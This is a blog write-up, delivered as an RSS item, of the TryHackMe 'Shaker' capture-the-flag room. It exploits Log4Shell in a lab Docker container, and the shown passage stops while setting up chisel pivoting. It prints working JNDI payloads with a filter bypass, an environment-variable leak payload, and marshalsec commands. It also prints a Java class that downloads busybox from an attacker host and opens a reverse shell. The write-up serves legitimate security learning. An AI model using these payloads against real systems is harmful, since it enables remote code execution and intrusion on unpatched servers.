<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>OmegaVoid - Blog of Many Things - OmegaVoid</title><link>/</link><description>Blog of Many Things</description><lastBuildDate>Wed, 26 Jan 2022 12:00:00 +0000</lastBuildDate><item><title>TryHackMe: Shaker Writeup</title><link>/tryhackme-shaker.html</link><description>&lt;p&gt;I don't often post writeups for CTF rooms, but I decided to make an exception for Shaker at TryHackme because I thought it not only did a very good demonstration of the impact of the recently infamous Log4Shell vulnerability but also showcased how hard it can be to secure a docker container.&lt;/p&gt;
&lt;p&gt;For full disclosure, I tested this room before release and provided feedback to the author (Hydragyrum) during development. I did so without access to a walkthrough, however, to attempt to simulate the challenge the end-user would actually be faced with. The machine has since then been given a couple of changes and further hardening. The present writeup, however, represents the current iteration of the room, at the time of writing and not the earlier testing version.&lt;/p&gt;
&lt;p&gt;The author's writeup can be found at: &lt;a href="https://hydrashead.net/posts/thm-shaker/"&gt;https://hydrashead.net/posts/thm-shaker/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I deviate from it quite a bit, however, and use it to demonstrate a few simpler attack techniques.&lt;/p&gt;
&lt;h2&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;We'll start by doing a port and service scan with Nmap.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo nmap -sC -sV -p- -Pn &lt;span class="m"&gt;10&lt;/span&gt;.10.x.x -T4 -vv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Truncating the the results for brevity can easily identify two ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PORT     STATE  SERVICE    REASON         VERSION
&lt;span class="m"&gt;22&lt;/span&gt;/tcp   open   ssh        syn-ack ttl &lt;span class="m"&gt;63&lt;/span&gt; OpenSSH &lt;span class="m"&gt;8&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; ...
&lt;span class="m"&gt;8080&lt;/span&gt;/tcp open   http-proxy syn-ack ttl &lt;span class="m"&gt;62&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; ...
&lt;span class="m"&gt;9090&lt;/span&gt;/tcp closed zeus-admin reset ttl &lt;span class="m"&gt;63&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We know we have an HTTP server on port 8080, and an OpenSSH on port 22 as is standard. We started by just browsing to the HTTP server and taking a look at the web application.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Application Screenshot." src="/images/shaker/app.png"&gt;&lt;/p&gt;
&lt;p&gt;It's a simple application that takes an XML file and does something to it. So we create a very simple XML file, to see what exactly it does.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;author&amp;gt;&lt;/span&gt;OmegaVoid&lt;span class="nt"&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Shaker&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;This is not the actual blog post xml, but how meta.&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;tag&amp;gt;&lt;/span&gt;writeup&lt;span class="nt"&gt;&amp;lt;/tag&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We'll name it &lt;code&gt;post.xml&lt;/code&gt; and upload it to the application.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Application result after uploading post.xml." src="/images/shaker/app-response.png"&gt;&lt;/p&gt;
&lt;p&gt;The result is it just reordered the items in XML. Pretty useless application, but now we have a baseline knowledge of what it does.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;Download Here!&lt;/code&gt; link is: &lt;code&gt;http://10.10.x.x:8080/uploads/22c62a3ceca270.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which reveals an upload folder, and the xml has been renamed.&lt;/p&gt;
&lt;p&gt;At this point we'd naturally be thinking that we could be facing an XXE or File Upload vulnerability. 
However, if you go in that direction, we will quickly find ourselves in a rabbit hole, and none of our payloads seem to work. &lt;/p&gt;
&lt;p&gt;And if payloads don't work after a few minutes/hours, we force ourselves to move on.&lt;/p&gt;
&lt;p&gt;But we're not done with Recon. There's a couple of extra hints in this last page.&lt;/p&gt;
&lt;p&gt;Looking at the source code:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment in the source code." src="/images/shaker/source-comment.png"&gt;&lt;/p&gt;
&lt;p&gt;At the time of room release, this should be instantly firing up alerts on your brain. If not, there's another hint in the favicon:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Application Favicon" src="/images/shaker/favicon.png"&gt;&lt;/p&gt;
&lt;p&gt;Most people I know missed that one, but it's pretty normal to not notice favicons, and a custom one might not exactly catch your attention, so don't stress it. It's pretty funny though - and a clear reference to Log4Shell - CVE-2021-44228. For a great post about it see: &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Either way, finding a mention to logs should have been enough to get us started. At this point, we could start fuzzing to search for the logs, and trying to use a custom number list to find those 4 suffix numbers, in an attempt to get access to the actual log files. This would facilitate our exploitation.&lt;/p&gt;
&lt;p&gt;However, this is not strictly necessary, and I actively avoided it because Hydragyrum is known for having fail2ban bruteforce protection on his challenges. Turns out he didn't have it enabled on this one, so we missed that, but we'll use the opportunity to do some black-box exploitation.&lt;/p&gt;
&lt;h2&gt;Log4Shell - CVE-2021-44228&lt;/h2&gt;
&lt;p&gt;Log4Shell is a now infamous vulnerability that the infosec community will be hearing about for years to come. This flaw the Log4j java software component has a varied impact and can be exploited in multiple ways. The most common method of exploitation consists of providing a specific string to application inputs, and when that message is logged it causes a message lookup, which starts a request via JNDI (Java Naming and Directory Interface) which uses a directory service (like LDAP) to obtain and execute Java resources, resulting in RCE (Remote Code Execution).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is worth pointing out that there are other possibilities of exploitation. For insntance, even if RCE is not obtained it can be possible to use this to exfiltrate Environment Variables via non JNDI payloads such as &lt;code&gt;${env:USERNAME}&lt;/code&gt; (so keep your env close and your AWS API keys closer). We can even nest these lookups to exfiltrate data via DNS, or other services. We will make use of this later.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For some detailed instructions on this vulnerability and how to exploit it see the room: &lt;a href="https://tryhackme.com/room/solar"&gt;https://tryhackme.com/room/solar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The exploit essentially consists of 4 steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;We submit a payload on a logged input in the application.&lt;/li&gt;
&lt;li&gt;The application processes the message lookup and requests the java resource from a directory service (LDAP in this case).&lt;/li&gt;
&lt;li&gt;LDAP provides a reference to the location where the java resource can be obtained.&lt;/li&gt;
&lt;li&gt;Application download the java resource, and executes it.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Ok. Now that I've bored you to death with a bit of details, what can we do in our application? We can supply as many inputs as we find with the payload until we find something vulnerable. We can try the XML filename, we can try the XML content, we can try different headers in our HTTP request, etc.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: If we had fuzzed and found the logs, we would have a better understanding of what's being logged, and we could build our payload faster. But we decided not to, and so with less enumeration, things get dirtier.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;How do we do this? We place the following payload on all the possible inputs we can think of (one at a time):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;jndi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;ldap&lt;/span&gt;&lt;span class="p"&gt;://ATTACKER_IP_ADDRESS:&lt;/span&gt;&lt;span class="nv"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we start a netcat listener on port 8080.&lt;/p&gt;
&lt;p&gt;We tried a few things and when we tried the xml content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;author&amp;gt;&lt;/span&gt;${jndi:ldap://ATTACKER_IP_ADDRESS:8080/}&lt;span class="nt"&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Shaker&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;This is not the actual blog post xml, but how meta.&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;tag&amp;gt;&lt;/span&gt;writeup&lt;span class="nt"&gt;&amp;lt;/tag&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got the response:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Invalid XML response." src="/images/shaker/invalid.png"&gt;&lt;/p&gt;
&lt;p&gt;Ok. There's a filter in place. So, let's try the simplest of filter bypasses:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:8080/}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The application hangs, and we get a call on our listener&lt;/p&gt;
&lt;p&gt;&lt;img alt="The target callback proving it's vulnerable." src="/images/shaker/callback.png"&gt;&lt;/p&gt;
&lt;p&gt;Ok. So we know the target is vulnerable. So we need to set up the remaining steps for exploitation, to try to obtain RCE.&lt;/p&gt;
&lt;p&gt;We start a marshalsec (&lt;code&gt;**https://github.com/mbechler/marshalsec**&lt;/code&gt;) utility to serve as an LDAP referral service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP_ADDRESS:8000/#Exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This outputs “Listening on 0.0.0.0:1389” which mean that if we point our payload to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ldap://ATTACKER_IP_ADDRESS:1389/Exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It will then tell the server to download Exploit.class from port 8000 on our attack machine.&lt;/p&gt;
&lt;p&gt;So all we need now is an Exploit.class&lt;/p&gt;
&lt;p&gt;We will start with a simple exploit from the Solar room I mentioned earlier.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exploit&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ping -c 4 ATTACKER_IP_ADDRESS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We compile it with a java 8 compiler:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;javac Exploit.java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And host it on port 8000 with &lt;code&gt;python3 -m http.server&lt;/code&gt; or &lt;code&gt;updog&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To check if we have RCE, we start tcp dump and look for pings:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo tcpdump -i tun0 icmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And finally whttps://github.com/jpillora/chisele upload our payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And while we see a call on both marshall and our http server, we do not get a ping.&lt;/p&gt;
&lt;p&gt;&lt;img alt="The application requests our exploit from marshalsec." src="/images/shaker/call-marshalsec1.png"&gt;&lt;/p&gt;
&lt;p&gt;There could be multiple reasons for this. One of them could simply be that there's no ping binary. We tried a few other commands to no avail. No bash, no netcat, no wget, no curl.&lt;/p&gt;
&lt;p&gt;The author probably removed what he considered unnecessary binaries from container in an effort harden it further. This is a legitimate tactic as it makes living off the land much harder and increases the skill requirements for exploitation. However, with a vulnerability like log4j this is clearly insufficient because the vulnerability is essentially giving you programmatic access to all the features of the operating system.&lt;/p&gt;
&lt;p&gt;You don't have curl? Java can download for you. You don't have chmod? Java can change file permissions for you. We can take this as far as we want. However, if we're going to create a file, we have to deploy it somewhere we know we have permissions to.&lt;/p&gt;
&lt;p&gt;I tried /tmp/ at first but was unable to exploit, which means Hydragyrum probably hardened that as well. But we know exactly where we can create a file in the filesystem. the application uploads folder.&lt;/p&gt;
&lt;p&gt;So let's check the context of the application:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/${env:PWD}}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use this payload to leak the PWD environment variable which tells us the current path where the application is being executed.&lt;/p&gt;
&lt;p&gt;This return the following in marshalsec:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Send LDAP reference result &lt;span class="k"&gt;for&lt;/span&gt; /app redirecting to http://ATTACKER_IP_ADDRESS:8000/Exploit.class
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This tells us the application is running in &lt;code&gt;/app&lt;/code&gt; . So we will attempt to upload a binary to &lt;code&gt;/app/uploads&lt;/code&gt; (or we could use a relative path since we're already in &lt;code&gt;/app&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;To make thing easier for ourselves, we can now use java to upload a busybox static binary, make it executable and then make use of all the tools included in busybox to exploit the target.&lt;/p&gt;
&lt;p&gt;You can obtain busybox binaries from: &lt;a href="https://busybox.net/downloads/binaries/"&gt;https://busybox.net/downloads/binaries/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We'll host it on the same http server as our java exploit.&lt;/p&gt;
&lt;p&gt;Then we craft our java exploit to download busybox, change permissions, and execute a command that will give us a shell on port 8080.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.*&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.lang.*&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.StandardCopyOption&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.net.URL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Paths&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Files&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exploit&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ATTACKER_IP_ADDRESS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

            &lt;span class="c1"&gt;//Download the file&lt;/span&gt;
            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;FILE_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;:8000/busybox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;FILE_PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/app/uploads/busybox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

            &lt;span class="n"&gt;InputStream&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_URL&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;openStream&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;Files&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Paths&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_PATH&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;StandardCopyOption&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;REPLACE_EXISTING&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

            &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_PATH&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

            &lt;span class="c1"&gt;//check if file exists&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;()){&lt;/span&gt;

                &lt;span class="c1"&gt;//change file permissions&lt;/span&gt;
                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setExecutable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setReadable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setWritable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

            &lt;span class="p"&gt;}&lt;/span&gt;

            &lt;span class="c1"&gt;//Execute a command that gives us a reverse shell&lt;/span&gt;
            &lt;span class="n"&gt;Runtime&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/app/uploads/busybox nc &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; 8080 -e /app/uploads/busybox sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;


        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We compile it, set up a listener on port 8080, and send our payload again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="We get a reverse shell." src="/images/shaker/revshell.png"&gt;&lt;/p&gt;
&lt;p&gt;And we obtain our user shell. And the first flag as well.&lt;/p&gt;
&lt;h2&gt;Docker Enumeration&lt;/h2&gt;
&lt;p&gt;Looking at the root of the filesystem we can see we're in a docker container. We can also confirm that &lt;code&gt;/tmp&lt;/code&gt; was indeed not writable by user 1000.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Container file system." src="/images/shaker/container-fs.png"&gt;&lt;/p&gt;
&lt;p&gt;We could have written busybox directly to &lt;code&gt;/app&lt;/code&gt;, but we knew for sure that we could place it in uploads.&lt;/p&gt;
&lt;p&gt;We'll start docker enumeration with the network side of things. As suspected earlier, the container is missing a lot of useful binaries, but that's not a problem since we uploaded busybox.
First step is obtaining the IP address of the container:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Obtaining the IP address" src="/images/shaker/container-ip.png"&gt;&lt;/p&gt;
&lt;p&gt;Using &lt;code&gt;ip route get 1&lt;/code&gt; to obtain the address of the host:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Obtaining Host IP." src="/images/shaker/container-ip-route.png"&gt;&lt;/p&gt;
&lt;p&gt;At this point one option is to ping sweep for other containers, the other is to port scan the host to try to see what other services it might be running. For either option a static nmap binary would greatly facilitate things.&lt;/p&gt;
&lt;p&gt;We download nmap and port scan the host.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Host Nmap Scan." src="/images/shaker/container-nmap.png"&gt;&lt;/p&gt;
&lt;p&gt;We know that port 8080 is a port forward to the container we're in. But what is port 8888.&lt;/p&gt;
&lt;p&gt;At this point we could continue enumerating docker for other vulnerabilities and misconfigurations (in a penetration test we would do a full assessment of the container), but as we'll see it proved unnecessary for our objectives.&lt;/p&gt;
&lt;h2&gt;Attacking the Host&lt;/h2&gt;
&lt;p&gt;To check if it's an http server we can use curl, we had to download another static binary since it's not in the system:
&lt;img alt="Curl request to 172.18.0.1:8888." src="/images/shaker/host-curl.png"&gt;&lt;/p&gt;
&lt;p&gt;It's throwing us a Bad Request error, but it seems to reply, so we know we have something to investigate.&lt;/p&gt;
&lt;p&gt;To take a better look at this service, we decide to use &lt;a href="https://github.com/jpillora/chisel"&gt;chisel&lt;/a&gt; to port forward port 8888 to localhost:8888 on our attack machine.&lt;/p&gt;
&lt;p&gt;We use busybox once again to download chisel on the machine.&lt;/p&gt;
&lt;p&gt;On our machine we start a chisel server on port 9999:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Starting the chisel server" src="/images/shaker/chisel-server.png"&gt;&lt;/p&gt;
